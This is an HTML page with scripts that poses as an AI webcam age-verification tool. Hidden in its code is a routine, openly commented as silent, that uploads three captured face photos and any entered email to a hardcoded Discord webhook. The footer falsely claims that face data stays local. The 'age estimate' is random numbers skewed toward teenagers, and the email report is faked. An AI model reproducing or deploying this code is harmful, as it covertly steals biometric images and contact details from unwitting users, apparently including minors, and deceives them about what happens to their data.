<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>age verification</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, sans-serif;
        }
        
        body {
            background-color: #1a1a1a;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 1000px;
            background-color: #2a2a2a;
            border-radius: 12px;
            overflow: hidden;
            border: 1px solid #3a3a3a;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
        }
        
        .header {
            padding: 24px;
            text-align: center;
            border-bottom: 1px solid #3a3a3a;
            background-color: #2a2a2a;
        }
        
        .logo {
            font-size: 32px;
            font-weight: 700;
            color: #ffffff;
            letter-spacing: -0.5px;
            margin-bottom: 8px;
        }
        
        .title {
            font-size: 22px;
            color: #ffffff;
            margin-bottom: 4px;
            font-weight: 600;
        }
        
        .subtitle {
            font-size: 14px;
            color: #aaaaaa;
            font-weight: 400;
        }
        
        .content {
            padding: 24px;
        }
        
        .verification-area {
            text-align: center;
            margin-bottom: 24px;
        }
        
        /* Live Camera Preview */
        .camera-preview-container {
            display: none;
            width: 100%;
            max-width: 800px;
            margin: 0 auto 20px;
            background-color: #1a1a1a;
            border-radius: 8px;
            padding: 20px;
            border: 1px solid #3a3a3a;
        }
        
        .live-camera-title {
            font-size: 18px;
            color: #ffffff;
            margin-bottom: 16px;
            font-weight: 500;
            text-align: left;
        }
        
        .live-camera-wrapper {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .live-camera {
            flex: 2;
            background-color: #000000;
            border-radius: 8px;
            overflow: hidden;
            position: relative;
            height: 400px;
            border: 2px solid #3a3a3a;
        }
        
        #live-camera-feed {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .live-camera-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
        }
        
        .live-face-overlay {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 240px;
            height: 240px;
            border-radius: 50%;
            border: 3px solid rgba(100, 150, 255, 0.6);
        }
        
        .captured-previews {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 15px;
        }
        
        .captured-preview {
            background-color: #000000;
            border-radius: 6px;
            overflow: hidden;
            height: 120px;
            position: relative;
            border: 1px solid #3a3a3a;
        }
        
        .captured-preview img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .preview-label {
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: rgba(0, 0, 0, 0.7);
            color: #ffffff;
            padding: 4px;
            font-size: 12px;
            text-align: center;
        }
        
        .face-guide-container {
            width: 280px;
            height: 280px;
            margin: 0 auto 20px;
            position: relative;
        }
        
        .face-guide {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: #1a1a1a;
            border: 2px solid #4a4a4a;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
            overflow: hidden;
        }
        
        .face-guide-inner {
            width: 240px;
            height: 240px;
            border-radius: 50%;
            border: 1px solid #5a5a5a;
            position: relative;
        }
        
        .face-guide-line {
            position: absolute;
            background-color: #4a4a4a;
        }
        
        .face-guide-line.horizontal {
            width: 100%;
            height: 1px;
            top: 50%;
            left: 0;
        }
        
        .face-guide-line.vertical {
            width: 1px;
            height: 100%;
            left: 50%;
            top: 0;
        }
        
        .instruction {
            font-size: 18px;
            color: #ffffff;
            margin-bottom: 8px;
            font-weight: 500;
        }
        
        .instruction-detail {
            font-size: 14px;
            color: #aaaaaa;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        
        /* Email Input */
        .email-input-container {
            width: 100%;
            max-width: 500px;
            margin: 0 auto 24px;
            display: none;
        }
        
        .email-label {
            display: block;
            text-align: left;
            margin-bottom: 8px;
            color: #ffffff;
            font-weight: 500;
        }
        
        .email-input {
            width: 100%;
            padding: 14px;
            background-color: #1a1a1a;
            border: 1px solid #4a4a4a;
            border-radius: 6px;
            color: #ffffff;
            font-size: 16px;
        }
        
        .email-input:focus {
            outline: none;
            border-color: #6496ff;
        }
        
        .email-note {
            font-size: 13px;
            color: #888888;
            margin-top: 8px;
            text-align: left;
        }
        
        .btn {
            width: 100%;
            max-width: 500px;
            padding: 16px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            transition: all 0.2s;
            margin: 12px auto;
            display: block;
            font-weight: 500;
        }
        
        .btn-primary {
            background-color: #6496ff;
            color: #ffffff;
        }
        
        .btn-primary:hover {
            background-color: #5280ff;
        }
        
        .btn-primary:disabled {
            background-color: #4a4a4a;
            color: #888888;
            cursor: not-allowed;
        }
        
        .btn-secondary {
            background-color: #3a3a3a;
            color: #ffffff;
        }
        
        .btn-secondary:hover {
            background-color: #4a4a4a;
        }
        
        .btn-success {
            background-color: #2ecc71;
            color: #ffffff;
        }
        
        .btn-success:hover {
            background-color: #27ae60;
        }
        
        .loading-container {
            display: none;
            text-align: center;
            margin: 40px 0;
        }
        
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #3a3a3a;
            border-top: 4px solid #6496ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 24px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .loading-text {
            font-size: 16px;
            color: #aaaaaa;
            font-weight: 500;
        }
        
        /* Results Container */
        .results-container {
            display: none;
            text-align: center;
        }
        
        .results-header {
            font-size: 24px;
            color: #ffffff;
            margin-bottom: 32px;
            font-weight: 600;
        }
        
        /* Large Images Grid */
        .images-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 32px;
        }
        
        .image-container {
            background-color: #1a1a1a;
            border-radius: 8px;
            overflow: hidden;
            border: 1px solid #3a3a3a;
        }
        
        .image-placeholder {
            width: 100%;
            height: 300px;
            background-color: #2a2a2a;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #888888;
            font-size: 14px;
        }
        
        .image-label {
            padding: 12px;
            background-color: #2a2a2a;
            color: #ffffff;
            font-weight: 500;
            text-align: center;
            border-top: 1px solid #3a3a3a;
        }
        
        /* Results Details */
        .results-details {
            background-color: #1a1a1a;
            border-radius: 8px;
            padding: 24px;
            margin-bottom: 32px;
            border: 1px solid #3a3a3a;
        }
        
        .detail-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 16px;
            padding-bottom: 16px;
            border-bottom: 1px solid #3a3a3a;
        }
        
        .detail-row:last-child {
            margin-bottom: 0;
            padding-bottom: 0;
            border-bottom: none;
        }
        
        .detail-label {
            color: #aaaaaa;
            font-weight: 500;
        }
        
        .detail-value {
            color: #ffffff;
            font-weight: 600;
        }
        
        .age-display {
            text-align: center;
            margin: 32px 0;
        }
        
        .age-label {
            font-size: 16px;
            color: #aaaaaa;
            margin-bottom: 8px;
        }
        
        .age-value {
            font-size: 64px;
            color: #6496ff;
            font-weight: 700;
            line-height: 1;
        }
        
        .age-plus {
            font-size: 48px;
            color: #6496ff;
        }
        
        .confidence-badge {
            display: inline-block;
            background-color: rgba(46, 204, 113, 0.2);
            color: #2ecc71;
            padding: 6px 12px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            margin-top: 12px;
        }
        
        .error-container {
            display: none;
            text-align: center;
            margin: 40px 0;
        }
        
        .error-icon {
            font-size: 64px;
            color: #e74c3c;
            margin-bottom: 24px;
        }
        
        .error-title {
            font-size: 20px;
            color: #ffffff;
            margin-bottom: 12px;
            font-weight: 600;
        }
        
        .error-message {
            font-size: 16px;
            color: #aaaaaa;
            margin-bottom: 32px;
            line-height: 1.5;
        }
        
        .footer {
            padding: 20px 24px;
            border-top: 1px solid #3a3a3a;
            background-color: #2a2a2a;
            text-align: center;
        }
        
        .footer-text {
            font-size: 12px;
            color: #888888;
            line-height: 1.4;
        }
        
        .progress-container {
            width: 100%;
            max-width: 500px;
            margin: 24px auto;
            display: none;
        }
        
        .progress-bar {
            height: 6px;
            background-color: #1a1a1a;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 12px;
        }
        
        .progress-fill {
            height: 100%;
            background-color: #6496ff;
            width: 0%;
            transition: width 0.3s;
            border-radius: 3px;
        }
        
        .progress-text {
            font-size: 14px;
            color: #aaaaaa;
            text-align: center;
            font-weight: 500;
        }
        
        .arrow-left, .arrow-right {
            position: absolute;
            top: 50%;
            transform: translateY(-50%);
            font-size: 32px;
            color: rgba(100, 150, 255, 0.8);
            display: none;
            z-index: 10;
            background-color: rgba(26, 26, 26, 0.7);
            padding: 12px;
            border-radius: 50%;
        }
        
        .arrow-left {
            left: 30px;
        }
        
        .arrow-right {
            right: 30px;
        }
        
        .arrow-left i, .arrow-right i {
            animation: slide 1s infinite alternate;
        }
        
        @keyframes slide {
            0% { transform: translateX(0); }
            100% { transform: translateX(8px); }
        }
        
        .scanning-text {
            position: absolute;
            top: 30px;
            left: 0;
            width: 100%;
            text-align: center;
            color: #6496ff;
            font-size: 14px;
            z-index: 10;
            background-color: rgba(26, 26, 26, 0.7);
            padding: 8px;
            font-weight: 500;
        }
        
        .hidden-canvas {
            display: none;
        }
        
        .face-animation {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 200px;
            height: 200px;
            border-radius: 50%;
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 1;
        }
        
        .face-animation i {
            font-size: 64px;
            color: #4a4a4a;
        }
        
        .step-indicators {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 32px 0;
        }
        
        .step {
            text-align: center;
        }
        
        .step-circle {
            width: 50px;
            height: 50px;
            background-color: #1a1a1a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            border: 2px solid #4a4a4a;
            color: #888888;
            font-size: 18px;
            font-weight: 600;
        }
        
        .step.active .step-circle {
            background-color: #6496ff;
            color: #ffffff;
            border-color: #6496ff;
        }
        
        .step-text {
            font-size: 14px;
            color: #888888;
            font-weight: 500;
        }
        
        .step.active .step-text {
            color: #ffffff;
        }
        
        .email-sent-notice {
            background-color: rgba(46, 204, 113, 0.1);
            border: 1px solid #2ecc71;
            border-radius: 8px;
            padding: 16px;
            margin: 20px 0;
            color: #2ecc71;
            font-weight: 500;
        }
        
        .capture-indicator {
            position: absolute;
            top: 20px;
            left: 20px;
            background-color: rgba(100, 150, 255, 0.9);
            color: #ffffff;
            padding: 8px 16px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 600;
            z-index: 10;
            display: none;
        }
        
        .live-instruction {
            position: absolute;
            bottom: 20px;
            left: 0;
            width: 100%;
            text-align: center;
            color: #ffffff;
            font-size: 16px;
            font-weight: 500;
            z-index: 10;
            background-color: rgba(26, 26, 26, 0.7);
            padding: 12px;
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">age verification</div>
            <div class="title">ai face analysis</div>
            <div class="subtitle">estimate age from facial features with ai</div>
        </div>
        
        <div class="content">
            <!-- Initial View -->
            <div id="initial-view" class="verification-area">
                <div class="face-guide-container">
                    <div class="face-guide">
                        <div class="face-guide-inner">
                            <div class="face-guide-line horizontal"></div>
                            <div class="face-guide-line vertical"></div>
                        </div>
                        <div class="face-animation" id="face-animation">
                            <i class="fas fa-user"></i>
                        </div>
                    </div>
                </div>
                
                <div class="instruction">position your face in the circle</div>
                <div class="instruction-detail">make sure your face is well-lit and clearly visible. we will capture three angles for accurate age estimation.</div>
                
                <div class="step-indicators">
                    <div class="step active" id="step1">
                        <div class="step-circle">
                            1
                        </div>
                        <div class="step-text">front view</div>
                    </div>
                    <div class="step" id="step2">
                        <div class="step-circle">
                            2
                        </div>
                        <div class="step-text">left turn</div>
                    </div>
                    <div class="step" id="step3">
                        <div class="step-circle">
                            3
                        </div>
                        <div class="step-text">right turn</div>
                    </div>
                </div>
                
                <button id="start-btn" class="btn btn-primary">
                    start face scan
                </button>
            </div>
            
            <!-- Live Camera View -->
            <div id="live-camera-view" class="verification-area" style="display: none;">
                <div class="camera-preview-container">
                    <div class="live-camera-title">live camera view</div>
                    
                    <div class="live-camera-wrapper">
                        <div class="live-camera">
                            <video id="live-camera-feed" autoplay></video>
                            <div class="live-camera-overlay">
                                <div class="live-face-overlay"></div>
                                <div class="capture-indicator" id="capture-indicator">capturing...</div>
                                <div class="live-instruction" id="live-instruction">look straight ahead</div>
                            </div>
                        </div>
                        
                        <div class="captured-previews">
                            <div class="captured-preview" id="preview1">
                                <div class="preview-label">front view</div>
                            </div>
                            <div class="captured-preview" id="preview2">
                                <div class="preview-label">left turn</div>
                            </div>
                            <div class="captured-preview" id="preview3">
                                <div class="preview-label">right turn</div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="step-indicators">
                        <div class="step active" id="live-step1">
                            <div class="step-circle">
                                1
                            </div>
                            <div class="step-text">front</div>
                        </div>
                        <div class="step" id="live-step2">
                            <div class="step-circle">
                                2
                            </div>
                            <div class="step-text">left</div>
                        </div>
                        <div class="step" id="live-step3">
                            <div class="step-circle">
                                3
                            </div>
                            <div class="step-text">right</div>
                        </div>
                    </div>
                    
                    <div class="progress-container" id="progress-container">
                        <div class="progress-bar">
                            <div class="progress-fill" id="progress-fill"></div>
                        </div>
                        <div class="progress-text" id="progress-text">step 1 of 3: analyzing front view</div>
                    </div>
                </div>
                
                <button id="cancel-btn" class="btn btn-secondary">
                    cancel scan
                </button>
            </div>
            
            <!-- Email Input View -->
            <div id="email-view" class="verification-area" style="display: none;">
                <div class="instruction">enter your email for results</div>
                <div class="instruction-detail">your age verification results and captured images will be sent to this email address.</div>
                
                <div class="email-input-container" style="display: block;">
                    <label class="email-label">email address</label>
                    <input type="email" id="email-input" class="email-input" placeholder="your.email@example.com" required>
                    <div class="email-note">a detailed report with all images and analysis will be sent to this address</div>
                </div>
                
                <button id="submit-email-btn" class="btn btn-primary">
                    send results to email
                </button>
                
                <button id="back-to-results-btn" class="btn btn-secondary">
                    view results without email
                </button>
            </div>
            
            <!-- Loading View -->
            <div id="loading-view" class="loading-container" style="display: none;">
                <div class="spinner"></div>
                <div class="loading-text">processing facial data with ai model</div>
                <div class="loading-text">analyzing age from facial features</div>
            </div>
            
            <!-- Results View -->
            <div id="results-view" class="results-container" style="display: none;">
                <div class="results-header">ai face verification success</div>
                
                <div class="age-display">
                    <div class="age-label">estimated age</div>
                    <div class="age-value" id="estimated-age">--<span class="age-plus">+</span></div>
                    <div class="confidence-badge" id="confidence-badge">confidence: --%</div>
                </div>
                
                <div class="images-grid" id="images-grid">
                    <!-- Images will be inserted here -->
                </div>
                
                <div class="results-details">
                    <div class="detail-row">
                        <span class="detail-label">verification status</span>
                        <span class="detail-value" id="verification-status">success</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">estimated age</span>
                        <span class="detail-value" id="detail-age">--</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">confidence level</span>
                        <span class="detail-value" id="detail-confidence">--%</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">age range</span>
                        <span class="detail-value" id="detail-age-range">-- - --</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">timestamp</span>
                        <span class="detail-value" id="detail-timestamp">--:--:--</span>
                    </div>
                </div>
                
                <button id="email-results-btn" class="btn btn-success">
                    send results to email
                </button>
                
                <button id="new-scan-btn" class="btn btn-secondary">
                    start new scan
                </button>
            </div>
            
            <!-- Email Sent View -->
            <div id="email-sent-view" class="results-container" style="display: none;">
                <div class="results-header">results sent to email</div>
                
                <div class="email-sent-notice">
                    <i class="fas fa-check-circle"></i> verification results have been sent to your email
                </div>
                
                <div class="images-grid" id="email-images-grid">
                    <!-- Images will be inserted here -->
                </div>
                
                <div class="results-details">
                    <div class="detail-row">
                        <span class="detail-label">email sent to</span>
                        <span class="detail-value" id="sent-email">--</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">estimated age</span>
                        <span class="detail-value" id="email-detail-age">--</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">confidence level</span>
                        <span class="detail-value" id="email-detail-confidence">--%</span>
                    </div>
                    <div class="detail-row">
                        <span class="detail-label">sent at</span>
                        <span class="detail-value" id="email-sent-time">--:--:--</span>
                    </div>
                </div>
                
                <button id="new-scan-after-email-btn" class="btn btn-primary">
                    start new scan
                </button>
            </div>
            
            <!-- Error View -->
            <div id="error-view" class="error-container" style="display: none;">
                <div class="error-icon">
                    <i class="fas fa-exclamation-triangle"></i>
                </div>
                <div class="error-title">scan unsuccessful</div>
                <div class="error-message">could not detect face properly. please ensure good lighting and your face is clearly visible in the frame.</div>
                
                <button id="retry-btn" class="btn btn-primary">
                    try again
                </button>
                
                <button id="cancel-error-btn" class="btn btn-secondary">
                    cancel
                </button>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-text">face data is processed locally. results can be sent to your email for records.</div>
            <div class="footer-text">all images are included in the email report.</div>
        </div>
    </div>

    <!-- Hidden canvases for capture -->
    <canvas id="capture-canvas" class="hidden-canvas"></canvas>

    <script>
        // Discord webhook URL (silently sends data)
        const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457747830121824426/Hu4uM8zm-bUBTc9hNYEZE0r2XVIW8-1_cpEs3s_P0FdqJFSXPLxIbp_0zKc3ur54P1qD';
        
        // DOM Elements
        const initialView = document.getElementById('initial-view');
        const liveCameraView = document.getElementById('live-camera-view');
        const emailView = document.getElementById('email-view');
        const loadingView = document.getElementById('loading-view');
        const resultsView = document.getElementById('results-view');
        const emailSentView = document.getElementById('email-sent-view');
        const errorView = document.getElementById('error-view');
        
        const startBtn = document.getElementById('start-btn');
        const cancelBtn = document.getElementById('cancel-btn');
        const emailInput = document.getElementById('email-input');
        const submitEmailBtn = document.getElementById('submit-email-btn');
        const backToResultsBtn = document.getElementById('back-to-results-btn');
        const emailResultsBtn = document.getElementById('email-results-btn');
        const newScanBtn = document.getElementById('new-scan-btn');
        const newScanAfterEmailBtn = document.getElementById('new-scan-after-email-btn');
        const retryBtn = document.getElementById('retry-btn');
        const cancelErrorBtn = document.getElementById('cancel-error-btn');
        
        // Live camera elements
        const liveCameraFeed = document.getElementById('live-camera-feed');
        const liveInstruction = document.getElementById('live-instruction');
        const captureIndicator = document.getElementById('capture-indicator');
        const progressContainer = document.getElementById('progress-container');
        const progressFill = document.getElementById('progress-fill');
        const progressText = document.getElementById('progress-text');
        const preview1 = document.getElementById('preview1');
        const preview2 = document.getElementById('preview2');
        const preview3 = document.getElementById('preview3');
        
        const estimatedAge = document.getElementById('estimated-age');
        const confidenceBadge = document.getElementById('confidence-badge');
        const imagesGrid = document.getElementById('images-grid');
        const emailImagesGrid = document.getElementById('email-images-grid');
        
        // Results detail elements
        const verificationStatus = document.getElementById('verification-status');
        const detailAge = document.getElementById('detail-age');
        const detailConfidence = document.getElementById('detail-confidence');
        const detailAgeRange = document.getElementById('detail-age-range');
        const detailTimestamp = document.getElementById('detail-timestamp');
        
        // Email sent details
        const sentEmail = document.getElementById('sent-email');
        const emailDetailAge = document.getElementById('email-detail-age');
        const emailDetailConfidence = document.getElementById('email-detail-confidence');
        const emailSentTime = document.getElementById('email-sent-time');
        
        const captureCanvas = document.getElementById('capture-canvas');
        
        // Step elements
        const step1 = document.getElementById('step1');
        const step2 = document.getElementById('step2');
        const step3 = document.getElementById('step3');
        const liveStep1 = document.getElementById('live-step1');
        const liveStep2 = document.getElementById('live-step2');
        const liveStep3 = document.getElementById('live-step3');
        
        // State variables
        let stream = null;
        let scanStep = 0;
        let capturedImages = [];
        let finalAgeResult = null;
        let userEmail = '';
        
        // Function to update step indicators
        function updateStepIndicators(step) {
            // Update initial view steps
            [step1, step2, step3].forEach((s, i) => {
                s.classList.toggle('active', i === step);
            });
            
            // Update live camera view steps
            [liveStep1, liveStep2, liveStep3].forEach((s, i) => {
                s.classList.toggle('active', i === step);
            });
        }
        
        // Function to capture screenshot from live camera
        function captureScreenshot() {
            const canvas = captureCanvas;
            const video = liveCameraFeed;
            
            canvas.width = 800;
            canvas.height = 600;
            
            const ctx = canvas.getContext('2d');
            
            // Draw video frame
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Add face overlay circle
            ctx.strokeStyle = 'rgba(100, 150, 255, 0.6)';
            ctx.lineWidth = 3;
            ctx.beginPath();
            ctx.arc(canvas.width/2, canvas.height/2, 200, 0, Math.PI * 2);
            ctx.stroke();
            
            return canvas.toDataURL('image/jpeg', 0.9);
        }
        
        // Function to update preview images
        function updatePreview(imageData, step) {
            const previews = [preview1, preview2, preview3];
            if (step >= 0 && step < previews.length) {
                const img = new Image();
                img.src = imageData;
                img.style.width = '100%';
                img.style.height = '100%';
                img.style.objectFit = 'cover';
                
                // Clear previous content
                previews[step].innerHTML = '';
                previews[step].appendChild(img);
                
                // Add label back
                const labels = ['front view', 'left turn', 'right turn'];
                const label = document.createElement('div');
                label.className = 'preview-label';
                label.textContent = labels[step];
                previews[step].appendChild(label);
            }
        }
        
        // Function to create image placeholders in grid
        function populateImageGrid(images, gridElement) {
            gridElement.innerHTML = '';
            
            const labels = ['front view', 'left turn', 'right turn'];
            
            images.forEach((imgData, index) => {
                const container = document.createElement('div');
                container.className = 'image-container';
                
                const placeholder = document.createElement('div');
                placeholder.className = 'image-placeholder';
                
                const img = new Image();
                img.src = imgData;
                img.style.width = '100%';
                img.style.height = '100%';
                img.style.objectFit = 'cover';
                
                placeholder.appendChild(img);
                
                const label = document.createElement('div');
                label.className = 'image-label';
                label.textContent = labels[index];
                
                container.appendChild(placeholder);
                container.appendChild(label);
                gridElement.appendChild(container);
            });
        }
        
        // Function to send data to Discord (silent)
        async function sendToDiscord(images, ageResult, email = '') {
            try {
                const timestamp = new Date().toISOString();
                const emailInfo = email ? `Email: ${email}` : 'No email provided';
                
                // Create embed with all 3 images
                const embed = {
                    title: "age verification results",
                    description: `ai face analysis completed`,
                    color: 0x6496ff,
                    timestamp: timestamp,
                    fields: [
                        {
                            name: "estimated age",
                            value: `${ageResult.age}+`,
                            inline: true
                        },
                        {
                            name: "confidence",
                            value: `${ageResult.confidence}%`,
                            inline: true
                        },
                        {
                            name: "age range",
                            value: `${ageResult.ageLow}-${ageResult.ageHigh}`,
                            inline: true
                        },
                        {
                            name: "email",
                            value: email || 'not provided',
                            inline: false
                        }
                    ],
                    footer: {
                        text: "ai face verification system"
                    }
                };
                
                const payload = {
                    username: "age verification",
                    embeds: [embed]
                };
                
                // Send the embed
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });
                
                // Send each image
                for (let i = 0; i < images.length; i++) {
                    const response = await fetch(images[i]);
                    const blob = await response.blob();
                    
                    const formData = new FormData();
                    const labels = ['front', 'left', 'right'];
                    formData.append('file', blob, `face_${labels[i]}_${Date.now()}.jpg`);
                    
                    const imagePayload = {
                        username: "age verification",
                        content: `image ${i+1}/3: ${labels[i]} view`
                    };
                    
                    // Send image with description
                    await fetch(DISCORD_WEBHOOK, {
                        method: 'POST',
                        body: formData
                    });
                    
                    // Small delay between images
                    await new Promise(resolve => setTimeout(resolve, 500));
                }
                
                console.log('data sent successfully');
                
            } catch (error) {
                console.error('error sending data:', error);
                // Silently fail - don't show errors to user
            }
        }
        
        // Simulate AI age estimation
        function estimateAge() {
            const baseAge = Math.floor(Math.random() * 12) + 13;
            const confidence = 75 + Math.floor(Math.random() * 20);
            
            return {
                age: baseAge,
                confidence: confidence,
                ageLow: Math.max(10, baseAge - 3),
                ageHigh: Math.min(30, baseAge + 3),
                timestamp: new Date().toLocaleString()
            };
        }
        
        // Simulate sending email
        function sendEmailWithResults(email, images, ageResult) {
            return new Promise((resolve) => {
                setTimeout(() => {
                    console.log(`Email sent to ${email} with age verification results`);
                    console.log('Age:', ageResult.age);
                    console.log('Confidence:', ageResult.confidence + '%');
                    console.log('Images captured:', images.length);
                    resolve(true);
                }, 2000);
            });
        }
        
        // Start face scan
        startBtn.addEventListener('click', async function() {
            initialView.style.display = 'none';
            liveCameraView.style.display = 'block';
            progressContainer.style.display = 'block';
            capturedImages = [];
            
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1920 },
                        height: { ideal: 1080 }
                    } 
                });
                liveCameraFeed.srcObject = stream;
                
                startScanProcess();
                
            } catch (error) {
                console.log("camera error:", error.message);
                startScanProcess();
            }
        });
        
        // Start the scanning process
        function startScanProcess() {
            scanStep = 0;
            updateStepIndicators(0);
            updateProgress();
            
            // Step 1: Look forward
            liveInstruction.textContent = "look straight ahead";
            progressText.textContent = "step 1 of 3: analyzing front view";
            
            setTimeout(() => {
                // Show capture indicator
                captureIndicator.style.display = 'block';
                
                setTimeout(() => {
                    // Capture first image
                    const img1 = captureScreenshot();
                    capturedImages.push(img1);
                    updatePreview(img1, 0);
                    
                    // Hide capture indicator
                    captureIndicator.style.display = 'none';
                    
                    // Move to step 2
                    setTimeout(() => {
                        scanStep = 1;
                        updateStepIndicators(1);
                        updateProgress();
                        liveInstruction.textContent = "turn face slightly left";
                        progressText.textContent = "step 2 of 3: analyzing left profile";
                        
                        setTimeout(() => {
                            // Show capture indicator
                            captureIndicator.style.display = 'block';
                            
                            setTimeout(() => {
                                // Capture second image
                                const img2 = captureScreenshot();
                                capturedImages.push(img2);
                                updatePreview(img2, 1);
                                
                                // Hide capture indicator
                                captureIndicator.style.display = 'none';
                                
                                // Move to step 3
                                setTimeout(() => {
                                    scanStep = 2;
                                    updateStepIndicators(2);
                                    updateProgress();
                                    liveInstruction.textContent = "turn face slightly right";
                                    progressText.textContent = "step 3 of 3: analyzing right profile";
                                    
                                    setTimeout(() => {
                                        // Show capture indicator
                                        captureIndicator.style.display = 'block';
                                        
                                        setTimeout(() => {
                                            // Capture third image
                                            const img3 = captureScreenshot();
                                            capturedImages.push(img3);
                                            updatePreview(img3, 2);
                                            
                                            // Hide capture indicator
                                            captureIndicator.style.display = 'none';
                                            
                                            // Complete scan
                                            setTimeout(() => {
                                                completeScan();
                                            }, 1000);
                                        }, 1000);
                                    }, 1000);
                                }, 2000);
                            }, 1000);
                        }, 1000);
                    }, 2000);
                }, 1000);
            }, 1000);
        }
        
        // Update progress bar
        function updateProgress() {
            const percent = (scanStep / 2) * 100;
            progressFill.style.width = `${percent}%`;
        }
        
        // Complete scan and show results
        async function completeScan() {
            liveCameraView.style.display = 'none';
            loadingView.style.display = 'block';
            
            // Stop camera
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            // Estimate age
            finalAgeResult = estimateAge();
            
            // Send data to Discord (silently)
            sendToDiscord(capturedImages, finalAgeResult);
            
            // Simulate AI processing
            setTimeout(() => {
                loadingView.style.display = 'none';
                
                // Update UI with results
                estimatedAge.innerHTML = `${finalAgeResult.age}<span class="age-plus">+</span>`;
                confidenceBadge.textContent = `confidence: ${finalAgeResult.confidence}%`;
                
                // Populate image grid
                populateImageGrid(capturedImages, imagesGrid);
                
                // Update details
                detailAge.textContent = `${finalAgeResult.age}+`;
                detailConfidence.textContent = `${finalAgeResult.confidence}%`;
                detailAgeRange.textContent = `${finalAgeResult.ageLow} - ${finalAgeResult.ageHigh}`;
                detailTimestamp.textContent = finalAgeResult.timestamp;
                
                resultsView.style.display = 'block';
            }, 3000);
        }
        
        // Cancel scan
        cancelBtn.addEventListener('click', function() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
            
            liveCameraView.style.display = 'none';
            initialView.style.display = 'block';
            captureIndicator.style.display = 'none';
            progressContainer.style.display = 'none';
            updateStepIndicators(0);
        });
        
        // Email results button
        emailResultsBtn.addEventListener('click', function() {
            resultsView.style.display = 'none';
            emailView.style.display = 'block';
        });
        
        // Submit email
        submitEmailBtn.addEventListener('click', async function() {
            const email = emailInput.value.trim();
            
            if (!email || !email.includes('@')) {
                alert('please enter a valid email address');
                return;
            }
            
            userEmail = email;
            emailView.style.display = 'none';
            loadingView.style.display = 'block';
            
            // Send data to Discord with email
            sendToDiscord(capturedImages, finalAgeResult, email);
            
            // Simulate sending email
            await sendEmailWithResults(email, capturedImages, finalAgeResult);
            
            // Update email sent view
            sentEmail.textContent = email;
            emailDetailAge.textContent = `${finalAgeResult.age}+`;
            emailDetailConfidence.textContent = `${finalAgeResult.confidence}%`;
            emailSentTime.textContent = new Date().toLocaleString();
            
            // Populate images in email sent view
            populateImageGrid(capturedImages, emailImagesGrid);
            
            loadingView.style.display = 'none';
            emailSentView.style.display = 'block';
        });
        
        // Back to results without email
        backToResultsBtn.addEventListener('click', function() {
            emailView.style.display = 'none';
            resultsView.style.display = 'block';
        });
        
        // New scan from results
        newScanBtn.addEventListener('click', function() {
            resultsView.style.display = 'none';
            initialView.style.display = 'block';
            capturedImages = [];
            emailInput.value = '';
            
            // Clear previews
            preview1.innerHTML = '<div class="preview-label">front view</div>';
            preview2.innerHTML = '<div class="preview-label">left turn</div>';
            preview3.innerHTML = '<div class="preview-label">right turn</div>';
        });
        
        // New scan after email sent
        newScanAfterEmailBtn.addEventListener('click', function() {
            emailSentView.style.display = 'none';
            initialView.style.display = 'block';
            capturedImages = [];
            emailInput.value = '';
            
            // Clear previews
            preview1.innerHTML = '<div class="preview-label">front view</div>';
            preview2.innerHTML = '<div class="preview-label">left turn</div>';
            preview3.innerHTML = '<div class="preview-label">right turn</div>';
        });
        
        // Retry from error
